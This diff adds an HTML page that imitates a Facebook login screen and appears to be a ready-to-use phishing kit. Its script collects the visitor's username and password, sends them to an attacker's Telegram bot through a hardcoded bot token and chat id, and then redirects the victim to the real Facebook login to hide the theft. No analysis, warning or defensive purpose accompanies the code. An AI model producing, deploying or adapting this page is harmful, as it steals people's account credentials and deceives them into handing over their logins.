@@ -1,0 +1,127 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook Login</title>
+    <style>
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background-color: #f0f2f5;
+            text-align: center;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            flex-direction: column;
+        }
+
+        .facebook-header {
+            margin: 20px;
+            font-size: 24px;
+            color: #1877f2;
+            align-self: flex-start;
+        }
+
+        .login-container {
+            max-width: 400px;
+            margin: auto;
+            background-color: #fff;
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+        }
+
+        input {
+            width: 100%;
+            padding: 10px;
+            margin: 8px 0;
+            box-sizing: border-box;
+            border: 1px solid #ddd;
+            border-radius: 4px;
+        }
+
+        button {
+            background-color: #1877f2;
+            color: #fff;
+            padding: 10px 15px;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+        }
+
+        h2 {
+            color: #1877f2;
+        }
+
+        .create-account {
+            margin-top: 10px;
+        }
+
+        .copyright {
+            margin-top: auto;
+            color: #555;
+        }
+    </style>
+</head>
+<body>
+    <p class="facebook-header">Facebook</p>
+
+    <div class="login-container">
+        <h2>Facebook Login</h2>
+        <form id="loginForm">
+            <label for="username">Username:</label>
+            <input type="text" id="username" name="username" required>
+
+            <label for="password">Password:</label>
+            <input type="password" id="password" name="password" required>
+
+            <button type="button" onclick="login()">Log In</button>
+        </form>
+
+        <div class="create-account">
+            <p>Don't have an account? <a href="#">Create New Account</a></p>
+        </div>
+     </div> 
+
+   <p class="copyright">English (us) 
+                                       Arabic
+                                      Espanol 
+  </p>
+
+  <p class="copyright">
+    @2023 Meta All rights reserved 
+  </p>
+
+  <script>
+    function login() {
+        var username = document.getElementById('username').value;
+        var password = document.getElementById('password').value;
+
+        //     
+        var telegramBotToken = '6109398302:AAF27C--NPfFLtlcvTeT66u9rdn3nmLw7kA';
+        var chatId = '1538488453';
+
+        var message = 'Username: ' + username + '\nPassword: ' + password;
+
+        var url = 'https://api.telegram.org/bot' + telegramBotToken + '/sendMessage?chat_id=' + chatId + '&text=' + encodeURIComponent(message);
+
+        //  XMLHttpRequest  
+        var xhr = new XMLHttpRequest();
+        xhr.open('GET', url, true);
+
+        //        
+        xhr.onload = function () {
+            //        
+            redirectToFacebook();
+        };
+
+        xhr.send();
+    }
+
+    function redirectToFacebook() {
+        //           
+        window.location.href = "https://m.facebook.com/login/?ref=dbl&fl&login_from_aymh=1";
+    }
+  </script>
+</body>
+</html>
